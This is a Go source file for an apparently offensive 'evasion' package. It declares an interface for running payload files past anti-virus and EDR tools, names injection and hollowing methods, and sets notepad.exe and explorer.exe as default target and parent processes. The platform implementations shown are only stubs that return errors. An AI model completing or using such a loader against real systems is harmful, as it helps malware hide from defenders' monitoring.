package evasion

import (
	"fmt"
	"os"
	"runtime"
)

// Evasion, anti-virus and EDR solutions from evasion techniques
type Evasion interface {
	// ExecutePayload, execute the payload using evasion techniques
	ExecutePayload(filePath string) error
}

// EvasionMethod, defines the available evasion methods
type EvasionMethod string

const (
	WEM1 EvasionMethod = "WEM1" // PPID Spoofing + Process Hollowing
	WEM2 EvasionMethod = "WEM2" // Memory Execution
	WEM3 EvasionMethod = "WEM3" // APC Injection
	WEM4 EvasionMethod = "WEM4" // Thread Hijacking
	WEM5 EvasionMethod = "WEM5" // Reflective Loading
	LEM1 EvasionMethod = "LEM1" // Linux MemFD Execution
)

// Options, configuration options for evasion techniques
type Options struct {
	Method        EvasionMethod // The evasion method to use
	TargetProcess string        // Target process for Process Hollowing
	ParentProcess string        // Parent process for PPID Spoofing
}

// DefaultOptions, returns the default evasion options
func DefaultOptions() Options {
	return Options{
		Method:        "",             // Leave empty for automatic selection
		TargetProcess: "notepad.exe",  // Default target process for Windows
		ParentProcess: "explorer.exe", // Default parent process for Windows
	}
}

// New, creates a new Evasion instance for the operating system
func New(options Options) (Evasion, error) {
	switch runtime.GOOS {
	case "windows":
		return newWindowsEvasion(options)
	case "linux":
		return newLinuxEvasion(options)
	default:
		return nil, fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}
}

// ReadPayload, reads the specified file and returns its contents
func ReadPayload(filePath string) ([]byte, error) {
	payload, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("file reading error: %v", err)
	}
	return payload, nil
}

// Default implementations (for unsupported operating systems)
var newWindowsEvasion = func(options Options) (Evasion, error) {
	return nil, fmt.Errorf("Windows evasion not supported")
}

var newLinuxEvasion = func(options Options) (Evasion, error) {
	return nil, fmt.Errorf("Linux evasion not supported")
}
